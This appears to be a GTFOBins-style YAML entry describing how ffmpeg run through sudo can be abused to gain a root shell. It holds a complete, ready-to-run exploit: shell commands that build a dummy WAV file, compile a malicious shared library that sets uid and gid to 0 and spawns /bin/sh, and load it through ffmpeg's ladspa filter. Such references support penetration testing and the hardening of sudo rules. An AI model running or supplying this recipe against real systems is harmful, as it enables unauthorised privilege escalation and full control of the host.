---
functions:
  sudo:
    - description: The ladspa filter loads external plugins for audio processing. Load a malicious shared library to execute code and get a shell.
      code: |
        TD=$(mktemp -d)
        printf "\x52\x49\x46\x46\x24\x00\x00\x00\x57\x41\x56\x45\x66\x6d\x74\x20\x10\x00\x00\x00\x01\x00\x01\x00\x22\x56\x00\x00\x22\x56\x00\x00\x01\x00\x08\x00\x64\x61\x74\x61\x00\x00\x00\x00" > "$TD/any.wav"
        echo -e '#include <unistd.h>\n#include <stdlib.h>\n__attribute__((constructor)) static void setup(void) {\nsetgid(0);\nsetuid(0);\nsystem("/bin/sh -c reset");\nsystem("/bin/sh");\n}' | gcc -x c -shared -fPIC -o $TD/libgtfo.so - 
        sudo ffmpeg -i $TD/any.wav -af "ladspa=file=$TD/libgtfo.so" -f null a.wav
---
